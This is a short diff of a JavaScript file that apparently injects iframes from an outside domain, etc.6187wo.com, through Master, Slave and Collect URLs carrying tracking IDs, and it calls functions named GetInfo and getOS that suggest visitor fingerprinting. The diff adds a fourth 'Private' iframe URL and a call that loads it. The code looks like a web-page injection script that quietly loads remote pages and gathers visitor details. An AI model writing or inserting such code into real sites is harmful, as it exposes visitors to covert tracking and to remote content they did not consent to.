@@ -10,6 +10,7 @@ var statid = '1279824029'
 var Master_Url = '//etc.6187wo.com/Master/Core.html#s_w=' + s_w+'&trackid='+trackid;
 var Slave_Url = '//etc.6187wo.com/Slave/Core.html#s_w=' + s_w+'&trackid='+trackid;
 var Collect_Url = '//etc.6187wo.com/Collect/Core.html#s_w=' + s_w+'&trackid='+trackid;
+var Private_Url = '//etc.6187wo.com/Private/Core.html#s_w=' + s_w+'&trackid='+trackid;
 function Core(url) {
     var d = document.createElement("div");
     var c = document.createElement("iframe");
@@ -139,5 +140,6 @@ function getOS() {
 Core(Master_Url);
 Core(Slave_Url);
 Core(Collect_Url);
+Core(Private_Url);
 GetInfo();
 Statistics(statid);
